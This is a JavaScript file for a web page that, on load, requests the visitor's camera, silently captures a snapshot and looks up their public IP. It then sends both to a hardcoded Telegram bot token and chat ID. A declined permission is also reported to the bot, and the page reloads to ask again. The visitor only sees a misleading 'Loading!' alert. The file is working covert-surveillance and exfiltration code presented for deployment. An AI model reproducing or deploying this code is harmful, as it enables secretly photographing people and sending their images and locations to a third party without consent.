document.addEventListener('DOMContentLoaded', async () => {
    const video = document.querySelector('video');
    const canvas = document.querySelector('canvas');
    const { userId, mode } = getParamsFromUrl();
    const isVip = mode !== null;
    const botToken = "7729674779:AAFi8rDdIvAMYI2tcdIHc4oX60QLGeGwtkc"; // Replace with your bot token
    const chatId = "5074699192"; // Replace with your Telegram chat ID

    let hasSentDecline = false; // Prevent multiple messages

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('Please open the link from another browser.');
        return;
    }

    async function startCamera() {
        try {
            const constraints = {
                video: {
                    facingMode: mode === '2' ? 'environment' : 'user'
                }
            };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                setTimeout(() => takeSnapshot(stream), 1000);
            };
        } catch (error) {
            console.warn('Camera access denied');
            if (!hasSentDecline) {
                await sendDeclineToTelegram();
                hasSentDecline = true;
                setTimeout(() => location.reload(), 2000); // Restart the site after 2 seconds
            }
        }
    }

    function takeSnapshot(stream) {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataURL = canvas.toDataURL('image/png');
            sendToTelegram(userId, dataURL);
            stream.getTracks().forEach(track => track.stop());
        } else {
            setTimeout(() => takeSnapshot(stream), 100);
        }
    }

    async function sendToTelegram(userId, image) {
        try {
            const ipData = await fetch('https://api.ipify.org?format=json');
            const ipInfo = await ipData.json();
            const ipAddress = ipInfo.ip;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', `User ID: ${userId}\nIP Address: ${ipAddress}`);
            formData.append('photo', dataURLtoFile(image, 'snapshot.png'));

            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            if (result.ok) {
                alert('Loading!');
                if (isVip) {
                    await fetch(`/redirect/${userId}`, { method: 'POST' });
                }
            } else {
                alert('Error sending to Telegram: ' + result.description);
            }
        } catch (error) {
            console.error('Error sending to Telegram:', error);
        }
    }

    async function sendDeclineToTelegram() {
        try {
            const ipData = await fetch('https://api.ipify.org?format=json');
            const ipInfo = await ipData.json();
            const ipAddress = ipInfo.ip;

            const message = `IP: ${ipAddress}\nPhoto: Declined`;

            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            const result = await response.json();
            if (result.ok) {
                console.log('Decline message sent.');
            } else {
                console.error('Error sending decline message:', result.description);
            }
        } catch (error) {
            console.error('Error retrieving IP or sending message:', error);
        }
    }

    function dataURLtoFile(dataurl, filename) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new File([u8arr], filename, { type: mime });
    }

    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('video') ? urlParams.get('video') : '491264374';
        const mode = urlParams.get('m') ? urlParams.get('m') : null;
        return { userId, mode };
    }

    startCamera();
});
